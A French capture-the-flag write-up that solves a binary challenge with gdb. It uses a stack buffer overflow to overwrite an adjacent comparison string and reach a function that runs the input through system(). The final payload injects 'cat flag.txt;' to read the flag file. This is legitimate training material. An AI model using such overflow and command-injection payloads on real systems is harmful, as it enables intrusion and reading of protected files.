On ouvre le binaire fourni avec gdb (`gdb course`), met un breakpoint au début de la fonction main (`b main`) puis on avance instruction par instruction (`n`).

>Le plugin **pwndbg** s'avère très utile pour faire de l'exploitation de binaire car il permet d'avoir une vue d'ensemble de la stack, la heap ainsi que la pile d'exécution

Programme qui lit au max 0x100 = 256 bytes depuis stdin avec `fgets` dans `s` à l'adresse *0x7fffffffdda0* qui est un buffer de 106 bytes. Nous avons donc 256-106=150 bytes de buffer overflow.
![pseudoverflow1.png](/images/pseudoverflow1.png)

On trouve les occurrences de "gagne" dans la mémoire avec gdb:
`find 0x555555554000,0x555555559000,"gagne"`
- *0x555555556071*  
- *0x555555557071*

![pseudoverflow2.png](/images/pseudoverflow2.png)

On compare ce qui est à *0x7fffffffde0a* avec "gagne"
```
>>> 0x7fffffffde0a - 0x7fffffffdda0  
106
```
c'est juste après notre input dans la stack, donc on peut on changer la valeur 

test avec:
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagagne
```
Problème: `fgets` ajoute un \\n à la fin de la string.
On peut finir la string avant en ajoutant un \\0 avec **Ctrl+V** puis **Ctrl+AltGr+@**
La condition est maintenant vérifiée puis le programme appelle la fonction `win` avec en argument la string fournie par l'utilisateur.
Cette fonction exécute la string comme du code bash avec l'appel `system(...)`
![[pseudoverflow3.png]]

On cherche **flag.txt** donc on teste:
```
cat flag.txt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagagne
```
Ici, le ';' assure l'exécution du début de la string même si la suite n'est pas une commande bash valide.